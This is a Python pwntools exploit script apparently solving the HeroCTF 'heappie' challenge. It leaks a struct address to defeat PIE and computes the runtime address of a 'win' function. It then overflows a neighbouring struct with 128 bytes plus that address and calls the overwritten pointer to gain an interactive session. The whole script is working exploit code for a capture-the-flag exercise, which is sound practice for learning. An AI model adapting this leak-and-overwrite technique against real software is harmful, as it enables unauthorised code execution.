#!/home/kali/.venv/bin/python3

from pwn import *
import re

exe = './heappie'
elf = ELF(exe, checksec=False)
p = remote('pwn.heroctf.fr', 6000)

win_offset = elf.symbols['win']

# filling a first struct to leak an address:
p.sendline(b'1')
p.sendline(b'y')
p.sendline(b'play_1')
p.sendline(b'0')
p.sendline(b'biboup')

# leak address
p.sendline(b'4')

# collect data to parse it
data = p.recv(8192*10).decode()
data += p.recv(8192*10).decode()
data += p.recv(8192*10).decode()
print(f"###\ndata received: {data}\n###")

# look for pattern using re.search(pattern, string, flags=0)
matches = re.search('song: (0x[0-9A-Fa-f]+)', data)
print(f"matches: type: {type(matches)}, value: {matches}")
# Match: object returned by successful matches and searches.
matches = str(matches.group(0))[6:]

# getting global play_1 addr:
if matches:
    play_1_addr = int(matches, 16)
    print(f"leaked play_1_addr: {hex(play_1_addr)}")
else:
    print("found nothing")


# getting win_runtime_addr:
play_1_offset = elf.symbols['play_1']
print(f"play_1_offset: {hex(play_1_offset)}")

base_addr = play_1_addr - play_1_offset
print(f"base_addr: {hex(base_addr)}")

win_runtime_addr = base_addr + win_offset
print(f"win_runtime_addr: {hex(win_runtime_addr)}")


# overflowing struct:
p.sendline(b'1')
p.sendline(b'n')
p.sendline(b'play_2')
p.sendline(b'1')
p.sendline(b'A' * 128 + p64(win_runtime_addr))

# struct containing p64(win_runtime_addr)
p.sendline(b'1')
p.sendline(b'n')
p.sendline(b'play_3')
p.sendline(b'2')
p.sendline(b'eeee')

# now play_3 contains the win runtime address
p.sendline(b'2')
p.sendline(b'2')

p.interactive()
